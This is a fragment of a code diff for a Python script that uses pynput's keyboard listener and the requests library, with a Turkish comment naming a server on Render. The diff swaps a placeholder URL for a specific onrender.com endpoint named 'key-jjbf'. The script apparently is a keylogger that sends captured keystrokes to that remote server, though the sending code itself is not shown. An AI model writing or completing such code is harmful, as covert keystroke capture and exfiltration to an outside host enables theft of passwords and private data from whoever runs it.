@@ -2,7 +2,7 @@ import requests
 from pynput import keyboard
 
 # Render'daki sunucu URL'si
-SERVER_URL = "https://your-app.onrender.com/log"
+SERVER_URL = "https://key-jjbf.onrender.com"
 
 def on_press(key):
     try:
